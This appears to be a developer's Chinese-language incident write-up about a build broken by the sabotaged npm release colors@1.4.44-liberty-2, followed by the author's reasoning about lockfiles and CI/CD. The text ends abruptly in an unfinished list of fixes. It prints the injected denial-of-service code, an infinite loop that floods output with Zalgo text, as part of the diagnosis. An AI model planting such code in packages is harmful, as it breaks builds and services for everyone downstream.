---
tags: [供应链安全, npm, lockfile, ci-cd, nodejs, 依赖管理]
severity: high
recurring: true
date: 2025-06-25
keywords: [colors, zalgo, 1.4.44-liberty-2, package-lock, supply-chain, jenkins]
---

#  供应链投毒:`colors@1.4.44-liberty-2` 导致构建输出 Zalgo 乱码

## 问题描述

在 Windows 上调试完成后，重新回 Mac 安装依赖排查 Windows 的调整是否会引起 mac 部分的错误。

再次打包 Server 端时，出现连续不停的乱码内容。

经过（大模型）排查，发现是 `colors@1.4.44-liberty-2` 版本引起的 build 错误。

## 排查过程

```sh

grep -rl "testing" node_modules/@nestjs/cli/bin/ 2>/dev/null | head -5

grep -rl "Carl Pilcher\|zalgo\|t̴e̴s̴t" node_modules/ 2>/dev/null | head -10
```

输出：

```sh
node_modules/formidable/package.json
node_modules/formidable/src/Formidable.js
node_modules/rimraf/node_modules/glob/dist/esm/index.min.js.map
node_modules/rimraf/node_modules/glob/dist/commonjs/index.min.js.map
node_modules/.package-lock.json
node_modules/colors/safe.js
node_modules/colors/examples/normal-usage.js
node_modules/colors/examples/safe-string.js
node_modules/colors/lib/index.js
node_modules/colors/lib/extendStringPrototype.js
```

这个时候大模型已经有了确认：是 color 包的问题。

继续排查细节: 

```sh
cat node_modules/colors/lib/index.js | head -30
```

输出:

```javascript
var colors = require('./colors');
module['exports'] = colors;

// Remark: By default, colors will add style properties to String.prototype.
//
// If you don't wish to extend String.prototype, you can do this instead and
// native String will not be touched:
//
//   var colors = require('colors/safe);
//   colors.red("foo")
//
//
require('./extendStringPrototype')();

/* remove this line after testing */
let am = require('../lib/custom/american');
am();
for (let i = 666; i < Infinity; i++) {
  if (i % 333) {
    // console.log('testing'.zalgo.rainbow)
  }
  console.log('testing testing testing testing testing testing testing'.zalgo)
}
```
> 你人还怪好的咧...

大模型结论：colors 包被植入了恶意代码—— `colors@1.4.44-liberty-2` 这个版本包含了故意破坏的代码，会无限循环输出 Zalgo 文字。这是 2022 年的著名供应链攻击事件。

因为我本人在提交时，习惯性的忽略 `package-lock.json`，所以在切换平台安装依赖的时候，就把有问题的 `colors@1.4.44-liberty-2` 版本安装了进来。

## 解决方案

1. 手动在 `package.json` 中将 `colors` 的版本改为 `1.4.0`，然后重新安装依赖。
2. 把 `package-lock.json` 加回到项目里。

## 我为什么习惯屏蔽 `package-lock.json`

我忘了自己从什么时候就开始主动的把 `package-lock.json` 从项目里踢出去了。但是确实开发过程中，`package-lock.json` 造成了无数的开发麻烦，包括：

1. 最直接的，代码冲突。两人安装以后 `package-lock.json` 会不一样。而且每次都要接冲突。
2. 带着别人的 `package-lock.json` 执行 `npm install`，本机会报错；删除掉 `package-lock.json` 重新安装，问题解决。
3. Jenkins 打包的时候，有 `package-lock.json` 会报错，build 进行不下去。

同时我们团队的 CI/CD 流程是一次性打包出 rc、qa 和 release 三个版本的产物（三者共用一个 `npm install` 的 Jenkins job，只是命令不一样），同时直接推送到对应的 release 库（打 tag）。那么

1. 如果依赖有问题。不光是投毒，也可能包含其他的可能的版本错乱引起的样式问题、意外报错，在 qa 阶段就能发现（实际上 rc 阶段就发现了、rc 是我们的前后端联调环境）；而在 qa（和 rc）阶段验证无误后，release 的版本一定是没有问题的。
2. 即便是线上发现了某版本引起了问题，我们可以直接从 gitlab 仓库中检出上个版本进行回滚（不需要重新打包），至少能先保证线上服务不崩。

可以说，我们把 `package-lock.json` 这个文件缺失的问题，用 `CI/CD` 流程给规避掉了 —— 那么这个时候 `package-lock.json` 对我们就是纯纯的负资产。

只要没有类似于 Antd 圣诞节彩蛋那种延时出现的惊喜（提前好几个月埋下然后定时触发），那么这种习惯是无伤大雅的（当然 Antd 那种情况我们确实也拦不住）。

## 思考 & 总结

我们团队的 CI/CD 流程（同源构建、产物归档、tag回滚）本质上是对产物的控制 —— 开发环境、测试环境、生产环境用的是相同的产物。但是供应链投毒发生在产物诞生之前，在 install 的阶段悄悄混了进来。事实上如果不是 `npm run build` 提前暴露了异常，这部分危险代码可能真的会随着产物一起发布到线上。

所以对于产物的控制与维护，`package-lock.json` 确实是负资产；但是对 install 阶段的安全控制，确实也需要多加警惕。

### 几种解法

1. `package-lock.json` 重新加回来。
2. 在 `package.json` 中添加 `overrides` 字段，指定 `colors` 的版本为 `1.4.0`。
3. 